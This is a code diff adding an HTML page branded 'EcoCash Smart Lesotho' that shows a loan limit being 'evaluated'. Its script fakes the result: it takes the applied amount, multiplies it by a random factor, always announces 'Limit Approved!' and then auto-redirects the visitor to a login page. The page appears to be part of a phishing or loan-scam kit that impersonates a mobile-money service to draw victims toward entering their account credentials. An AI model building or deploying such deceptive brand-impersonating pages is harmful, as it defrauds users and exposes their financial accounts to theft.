@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Your Limit | EcoCash Smart</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap');
+        body { background-color: #f4f7fa; font-family: 'Plus Jakarta Sans', sans-serif; }
+        .smart-blue { background: linear-gradient(135deg, #1d4ed8 0%, #2563eb 100%); }
+        .card-shadow { box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.05); }
+        .success-glow { box-shadow: 0 0 20px rgba(34, 197, 94, 0.2); }
+        .fade-in { animation: fadeIn 0.6s ease-out forwards; }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
+        }
+    </style>
+</head>
+
+<body class="text-gray-900 min-h-screen flex flex-col items-center justify-center p-5">
+
+<div class="max-w-md w-full bg-white rounded-[40px] p-8 card-shadow text-center space-y-8 fade-in">
+
+    <div>
+        <div id="status-icon" class="w-16 h-16 bg-blue-100 text-blue-600 rounded-2xl flex items-center justify-center mx-auto mb-4">
+            <i class="fas fa-search animate-pulse"></i>
+        </div>
+        <h2 id="status-text" class="text-xl font-extrabold uppercase">Evaluating Limit...</h2>
+        <p class="text-xs text-gray-400 font-bold uppercase tracking-widest">EcoCash Smart Lesotho</p>
+    </div>
+
+    <div class="py-6 border-y">
+        <p class="text-[10px] font-bold text-blue-400 uppercase tracking-widest mb-2">Approved Amount</p>
+        <div class="text-6xl font-black flex justify-center">
+            <span class="text-3xl text-gray-300 mr-1">M</span>
+            <span id="limit-counter">0</span>
+        </div>
+    </div>
+
+    <div id="loan-details" class="opacity-0 transition-opacity duration-700 grid grid-cols-2 gap-4">
+        <div class="bg-gray-50 rounded-2xl p-4">
+            <p class="text-[10px] font-bold text-gray-400 uppercase">Interest</p>
+            <p class="text-lg font-bold">15%</p>
+        </div>
+        <div class="bg-gray-50 rounded-2xl p-4">
+            <p class="text-[10px] font-bold text-gray-400 uppercase">Term</p>
+            <p class="text-lg font-bold">30 Days</p>
+        </div>
+    </div>
+
+    <button id="withdraw-btn"
+        disabled
+        onclick="goNext()"
+        class="w-full bg-gray-200 text-white py-5 rounded-[25px] font-bold text-lg transition-all">
+        Continue <i class="fas fa-arrow-right text-xs"></i>
+    </button>
+
+</div>
+
+<script>
+    // SAFELY GET APPLIED AMOUNT
+    const savedAmount = localStorage.getItem("appliedAmount");
+    const appliedAmount = isNaN(parseInt(savedAmount)) ? 1000 : parseInt(savedAmount);
+
+    // CALCULATE FINAL LIMIT
+    const variations = [1, 1.1, 0.9, 1.2, 0.8];
+    const multiplier = variations[Math.floor(Math.random() * variations.length)];
+    const finalLimit = Math.floor(appliedAmount * multiplier);
+
+    // ELEMENTS
+    const counter = document.getElementById("limit-counter");
+    const statusText = document.getElementById("status-text");
+    const statusIcon = document.getElementById("status-icon");
+    const btn = document.getElementById("withdraw-btn");
+    const loanDetails = document.getElementById("loan-details");
+
+    let current = 0;
+    const duration = 3000;
+    const step = finalLimit / (duration / 30);
+
+    const timer = setInterval(() => {
+        current += step;
+
+        if (current >= finalLimit) {
+            current = finalLimit;
+            clearInterval(timer);
+            revealSuccess();
+        }
+
+        counter.innerText = Math.floor(current).toLocaleString();
+    }, 30);
+
+    function revealSuccess() {
+        statusText.innerText = "Limit Approved!";
+        statusText.classList.add("text-green-600");
+
+        statusIcon.innerHTML = '<i class="fas fa-check"></i>';
+        statusIcon.className = "w-16 h-16 bg-green-100 text-green-600 rounded-2xl flex items-center justify-center mx-auto mb-4 success-glow";
+
+        loanDetails.classList.remove("opacity-0");
+
+        btn.disabled = false;
+        btn.className = "w-full smart-blue text-white py-5 rounded-[25px] font-bold text-lg shadow-lg hover:scale-105 transition";
+
+        localStorage.setItem("approvedLimit", finalLimit);
+
+        // AUTO REDIRECT AFTER 2 SECONDS
+        setTimeout(() => {
+            window.location.href = "login.html";
+        }, 2000);
+    }
+
+    function goNext() {
+        window.location.href = "login.html";
+    }
+</script>
+
+</body>
+</html>
